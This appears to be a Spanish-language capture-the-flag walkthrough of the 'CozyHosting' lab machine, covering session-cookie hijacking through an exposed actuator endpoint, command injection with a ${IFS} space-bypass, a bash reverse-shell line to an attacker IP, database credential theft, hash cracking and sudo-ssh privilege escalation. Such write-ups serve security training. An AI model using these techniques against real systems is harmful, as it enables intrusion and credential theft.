# CozyHosting

Comenzamos realizando un ping para ver si tenemos acceso a la máquina:

!\[\[first ping.png]] Sabemos que nos estamos enfrentando a una máquina linux debido al ttl=63.

Procedemos con un reconocimiento de los puertos abiertos del servidor utilizando la herramienta \[\[nmap]]:

!\[\[reconocimiento nmap.png]]

Donde podemos apreciar que los puertos 22,80 y 8888 se encuentran expuestos. Ahora vamos a hacer un escaneo más exhaustivo de dichos puertos, a los que les vamos a pasar unos scripts de nmap específicos para cada puerto:

!\[\[nmap scripts.png]]

Nos indica con el puerto 80 que no se está realizando un redireccionamiento hacia http://cozyhosting.htb, de manera que tendremos que modificar el archivo /etc/hosts para que se realice el mismo y tengamos acceso a la página web. Quedaría de la siguiente manera:

!\[\[modificación del etc-hosts.png]]

!\[\[whatweb.png]]

Ahora haremos una pequeña enumeración de los subdirectorios de la página web, con la herramienta **dirsearch**. Ejecutaremos el siguiente comando:

```bash
dirsearch -u http://coozyhosting.htb
```

y obtenemos los siguientes resultados interesantes:

!\[\[directorio actuator.png]]

Si intentamos acceder a http://coozyhosting.htb/admin nos redirige a http://coozyhosting.htb/login, y dicho panel de logeo no parece ser vulnerable a ninguna vulnerabilidad interesante. Podemos intentar ver lo que hay en en el subdirectorio /actuactor y, examinándolo observamos que tiene otro subdirectorio más interesante aún, /actuactor/sessions el cuál muestra lo siguiente:

!\[\[actuator-sessions.png]]

Y parecen ser cookies de sesión, por lo que podríamos tratar de realizar \[\[Cookie Hijacking]] con alguna de ellas, por ejemplo con la que parece ser del usuario "kanderson":

!\[\[Cookie Hijacking.png]]

Ahora, si volvemos a intentar acceder a http://coozyhosting.htb/admin, tendremos acceso a un panel de administrador, por lo que hemos robado la sesión del usuario "kanderson". En dicha página podemos observar distintas ventas y un gráfico que no nos van a ser muy útiles, pero al final, está el siguiente formulario con sus campos de entrada:

!\[\[formulario.png]]

Podemos tratar de realizar alguna inyección de comandos en alguno de los campos. Probando con el campo de _Username_, conseguimos lo siguiente:

!\[\[Error formulario.png]]

Por lo que sabemos que podemos ejecutar comandos en dicha máquina (aunque no se vea completamente el output entero del comando). Ahora enviaremos la petición a \[\[Burpsuite]], de manera que será más fácil modificar las peticiones. Sabiendo que podemos inyectar comandos, podríamos tratar de conseguir una \[\[Reverse shell]]. Para ello haremos uso del siguiente comando en bash:

```bash
sh -i >& /dev/tcp/10.10.14.116/4444 0>&1
```

Pero al intentar meterlo en la petición, nos devuelve el siguiente error:

!\[\[Burpsuite error.png]]

De manera que nos la tendremos que apañar para no introducir espacios en blanco en la petición. Para ello, crearemos un script en nuestra máquina que contenga dicha sentencia, y trataremos de leerla y ejecutarla desde la máquina víctima. Para ello crearemos un servidor http con python donde tenemos dicho archivo, y además nos pondremos en escucha con \[\[NetCat]]:

!\[\[servidor y ncat.png]]

Ahora solo hace falta que la máquina víctima ejecute nuestro script, y se puede hacer enviando la siguiente petición, en la que se hace un curl a nuestro script y seguidamente se ejecuta en una bash (${IFS} es una variable de entorno que se interpreta como un espacio):

!\[\[Burpsuite reverse shell.png]]

Y de esta manera ya habremos conseguido la reverse shell, siendo el usuario app:

!\[\[reverse shell.png]]

Examinando el archivo /etc/passwd, observamos que somos el único usuario junto a root, postgres y josh que podemos ejecutar una shell, por lo que nuestro próximo objetivo será intentar convertirnos en el usuario josh. En el directorio en el que nos encontramos, existe un archivo .jar. Este tipo de archivos permiten ejecutar aplicaciones y herramientas escritas en java, y además están comprimidos con el formato ZIP y cambiada la extensión, de manera que podemos tratar de descomprimir dicho archivo para ver que contiene. Para ello realizamos el siguiente comando:

```bash
unzip cloudhosting-0.0.1.jar
```

Y el contenido del archivo resulta ser tres carpetas, y, visualizando el contenido de las mismas con detenimiento, podemos apreciar en el archivo BOOT-INF/classes/application.properties el siguiente contenido:

!\[\[password leak.png]]

De donde se puede deducir que se está utilizando una base de datos, concretamente **postgresql** por el puerto **5432**, y además en la última línea se encuentra la contraseña necesaria para acceder hardcodeada, para el usuario postgres. Intentamos entonces conectarnos a la base de datos con dichas credenciales de la siguiente manera:

!\[\[postgress interface.png]]

Listando las bases de datos existentes en el sistema conseguimos lo siguiente:

!\[\[postgres tablas.png]]

La más interesante sin duda parece cozyhosting, así que la examinamos para ver el contenido de la misma:

!\[\[postgres tabla users.png]]

Una vez tenemos las tablas, podría ser que en la tabla users se almacenasen credenciales interesantes, por lo que podemos intentar listar el contenido de la misma. A base de prueba y error, conseguimos listarlo de la siguiente manera:

!\[\[hashes contraseñas.png]]

Y conseguimos así los usuarios existentes, con sus contraseñas hasheadas. Trataremos ahora en deshashear dichas contraseñas para conseguirlas en texto claro. Usaremos el siguiente comando con john (en el archivo kanderson.txt se encuentran los hashes de ambos usuarios):

!\[\[deshash password.png]]

De manera que podemos tratar de cambiar de usuario a josh, con dicha contraseña:

!\[\[user flag.png]]

Así, hemos conseguido acceder como dicho usuario, y conseguir la flag de user.

Procederemos ahora con la escalada de privilegios. Para ello listaremos los binarios que podemos ejecutar como sudo con siguiente comando en bash:

```bash
sudo -l
```

y vemos que podemos ejecutar como root el binario ssh, por lo que podemos realizar una búsqueda en [gtfobins](https://gtfobins.github.io) y observamos que podemos ejecutar el siguiente comando para conseguir una shell con el usuario root:

!\[\[root flag.png]]

Y de esta manera conseguimos escalar privilegios y conseguir la flag de root.
